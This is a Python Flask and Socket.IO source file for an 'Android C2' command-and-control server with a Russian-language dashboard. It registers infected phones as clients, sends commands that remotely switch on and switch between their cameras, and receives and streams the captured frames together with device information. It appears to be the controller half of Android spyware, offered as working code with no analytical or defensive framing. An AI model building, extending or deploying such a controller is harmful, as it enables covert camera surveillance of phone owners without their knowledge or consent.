from flask import Flask, render_template_string, Response
from flask_socketio import SocketIO
import os
import time
import base64

app = Flask(__name__)
app.config['SECRET_KEY'] = 'secret!'
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='eventlet')

clients = {}
camera_frames = {}

HTML = """
<!DOCTYPE html>
<html lang="ru" class="dark">
<head>
    <meta charset="UTF-8">
    <title>C2 Dashboard | Android</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        body { font-family: 'Inter', sans-serif; background-color: #0b0f19; color: #c9d1d9; }
        .sidebar { background-color: #111827; border-right: 1px solid #1f2937; }
        .client-row.selected { background-color: #1e3a8a; border-left: 3px solid #60a5fa; }
    </style>
</head>
<body class="h-screen overflow-hidden flex">
    <aside class="sidebar w-72 flex flex-col h-full">
        <div class="p-4 border-b border-gray-800 flex items-center gap-3">
            <div class="w-8 h-8 rounded bg-green-600 flex items-center justify-center text-white font-bold"><i class="fa-solid fa-mobile-screen"></i></div>
            <div><h1 class="text-sm font-bold text-white">ANDROID C2</h1></div>
        </div>
        <div class="flex-1 overflow-y-auto p-2"><div id="client-list" class="space-y-1"></div></div>
        <div id="main-menu" class="hidden border-t border-gray-800 p-2 space-y-1">
            <div onclick="switchView('phone-cam')" class="p-2 text-sm text-gray-400 hover:text-white cursor-pointer"><i class="fa-solid fa-camera w-4"></i> Camera</div>
            <div onclick="switchView('phone-info')" class="p-2 text-sm text-gray-400 hover:text-white cursor-pointer"><i class="fa-solid fa-mobile-button w-4"></i> Info</div>
        </div>
    </aside>
    <main class="flex-1 flex flex-col h-full bg-[#0b0f19] relative">
        <div id="view-empty" class="flex-1 flex items-center justify-center text-gray-600">NO CLIENT SELECTED</div>
        <div id="view-phone-cam" class="hidden p-6 flex-col h-full">
            <div class="flex justify-between items-center mb-4">
                <h2 class="text-lg font-bold text-white">Камера (HTTP Stream)</h2>
                <div class="flex gap-4">
                    <button onclick="switchCamera()" class="bg-gray-700 px-4 py-2 rounded text-sm text-white">Сменить</button>
                    <label class="flex items-center gap-2 text-sm text-gray-400"><input type="checkbox" onchange="toggleFeature('camera', this.checked)"> Вкл</label>
                </div>
            </div>
            <div class="bg-black h-[600px] w-[400px] flex items-center justify-center rounded border border-gray-800 relative">
                <img id="cam-img" class="max-h-full max-w-full object-contain hidden rotate-90">
                <span id="cam-placeholder" class="text-gray-600">STREAM OFFLINE</span>
            </div>
        </div>
        <div id="view-phone-info" class="hidden p-6"><h2 class="text-white">Info</h2><div id="phone-info-data" class="text-gray-300"></div></div>
    </main>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.0.1/socket.io.js"></script>
    <script>
        const socket = io();
        let currentClientId = null;

        socket.on('update_clients', (data) => {
            const list = document.getElementById('client-list');
            list.innerHTML = '';
            for (let id in data) {
                const div = document.createElement('div');
                div.className = `client-row p-2 rounded cursor-pointer ${currentClientId === id ? 'selected' : ''}`;
                div.innerHTML = `<div class="font-bold text-sm text-white">${data[id].user}</div>`;
                div.onclick = () => selectClient(id, data[id]);
                list.appendChild(div);
            }
        });

        function selectClient(id, data) {
            currentClientId = id;
            document.getElementById('view-empty').classList.add('hidden');
            document.getElementById('main-menu').classList.remove('hidden');
            switchView('phone-cam');
            if (data.info) document.getElementById('phone-info-data').innerText = JSON.stringify(data.info, null, 2);
        }

        function switchView(view) {
            if (!currentClientId) return;
            document.querySelectorAll('main > div[id^="view-"]').forEach(el => el.classList.add('hidden'));
            document.getElementById(`view-${view}`).classList.remove('hidden');
        }

        function toggleFeature(feat, state) { 
            socket.emit('toggle_feature', { client_id: currentClientId, feature: feat, state: state });
            if (feat === 'camera') {
                const img = document.getElementById('cam-img');
                if (state) {
                    img.src = `/video_feed/${currentClientId}`;
                    img.classList.remove('hidden');
                    document.getElementById('cam-placeholder').classList.add('hidden');
                } else {
                    img.src = "";
                    img.classList.add('hidden');
                    document.getElementById('cam-placeholder').classList.remove('hidden');
                }
            }
        }
        function switchCamera() { socket.emit('switch_camera', { client_id: currentClientId }); }
    </script>
</body>
</html>
"""

@app.route('/')
def index(): return render_template_string(HTML)

@app.route('/video_feed/<cid>')
def video_feed(cid):
    def generate():
        while True:
            if cid in camera_frames and camera_frames[cid]:
                frame = camera_frames[cid]
                yield (b'--frame\r\n' b'Content-Type: image/jpeg\r\n\r\n' + frame + b'\r\n')
            time.sleep(0.1) # 10 FPS
    return Response(generate(), mimetype='multipart/x-mixed-replace; boundary=frame')

@socketio.on('register_client')
def handle_register(data):
    clients[data['id']] = data
    socketio.emit('update_clients', clients)

@socketio.on('toggle_feature')
def handle_toggle(data): socketio.emit('cmd_toggle', data)

@socketio.on('switch_camera')
def handle_switch(data): socketio.emit('cmd_switch_camera', data)

@socketio.on('phone_cam_frame')
def handle_cam(data):
    cid = data.get('client_id')
    img_b64 = data.get('img')
    if cid and img_b64:
        camera_frames[cid] = base64.b64decode(img_b64)

if __name__ == '__main__':
    socketio.run(app, host='0.0.0.0', port=int(os.environ.get("PORT", 5000)))
